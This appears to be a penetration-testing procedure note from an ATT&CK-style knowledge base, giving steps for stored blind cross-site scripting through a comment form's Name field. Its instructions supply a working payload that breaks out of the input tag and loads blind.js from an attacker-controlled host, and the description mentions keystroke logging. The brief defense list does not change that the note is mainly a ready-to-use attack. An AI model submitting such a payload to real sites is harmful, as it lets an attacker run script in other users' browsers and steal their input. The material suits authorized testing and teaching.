---
id: uuid-inject-name
tags:
  - xss
  - stored-xss
  - javascript-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:26.061Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject Script in Name Field

## Summary

This procedure injects a malicious script tag into the Name field of the comment form, exploiting lack of sanitization to load external JavaScript persistently when comments are viewed.

## Description

The Name field allows arbitrary HTML/JS injection due to improper escaping. The payload closes the input tag and injects a script src to an attacker-controlled JS file (e.g., blind.js for logging). When an authenticated user views the comment, the script executes, enabling blind XSS detection and further actions like keystroke logging.

## Requirements

1. Access to the comment form from Step 1
2. Attacker server hosting blind.js at http://attackerip/
3. Basic HTML/JS knowledge for payload crafting

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs with HTML entity encoding
- Implement Content Security Policy (CSP) to block external script loads
- Monitor for anomalous script tags in stored data

## Objectives

1. Store persistent script injection
2. Achieve blind XSS execution on view
3. Confirm via server hits

## Instructions

### Step 1: Craft and Submit Payload

**Context**: Enter the payload to break out of the input context and inject the script.

In the Name field, input: `"><script src=http://attackerip/blind.js></script>`

Fill other fields minimally and click submit.

> Expected output: Form submits without validation errors; payload stored. Success confirmed by later server logs when viewed.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]

